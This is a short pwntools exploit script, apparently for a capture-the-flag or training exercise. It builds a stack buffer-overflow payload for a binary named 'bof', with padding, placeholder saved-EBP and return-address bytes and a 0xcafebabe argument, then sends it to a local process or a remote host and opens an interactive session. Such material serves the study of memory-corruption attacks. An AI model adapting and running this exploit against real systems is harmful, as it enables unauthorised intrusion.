from pwn import *
import sys

def start(argv=[], *a, **kw):
    if len(sys.argv) == 3:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = "./bof"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = start()

padding = 0x2c

payload = flat(
    b"A" * padding, # padding
    b"BBBB",        # Save ebp
    b"CCCC",        # return address
    0xcafebabe      # 
)

write('payload', payload)

io.sendline(payload)

io.interactive()